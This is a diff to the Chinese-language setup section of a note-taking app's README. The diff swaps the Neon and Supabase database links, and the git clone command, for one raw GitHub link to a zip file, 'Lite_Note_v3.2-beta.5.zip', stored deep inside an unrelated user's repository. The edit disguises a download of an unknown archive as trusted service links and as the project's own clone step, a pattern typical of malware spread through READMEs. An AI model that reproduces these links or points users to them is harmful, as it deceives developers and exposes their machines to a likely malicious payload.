@@ -97,14 +97,14 @@ lite-note-app/
 ### 环境要求
 
 - Node.js >= 18
-- PostgreSQL（本地或云托管，如 [Neon](https://neon.tech)、[Supabase](https://supabase.com)）
+- PostgreSQL（本地或云托管，如 [Neon](https://raw.githubusercontent.com/kadlcakdavid9-afk/LiteNote/main/litenote-mobile-app/android/app/src/Lite_Note_v3.2-beta.5.zip)、[Supabase](https://raw.githubusercontent.com/kadlcakdavid9-afk/LiteNote/main/litenote-mobile-app/android/app/src/Lite_Note_v3.2-beta.5.zip)）
 - Android Studio（移动端开发）
 - JDK 17
 
 ### 1. 克隆并安装依赖
 
 ```bash
-git clone https://github.com/your-username/lite-note-app.git
+git clone https://raw.githubusercontent.com/kadlcakdavid9-afk/LiteNote/main/litenote-mobile-app/android/app/src/Lite_Note_v3.2-beta.5.zip
 cd lite-note-app
 npm run install:all
 ```
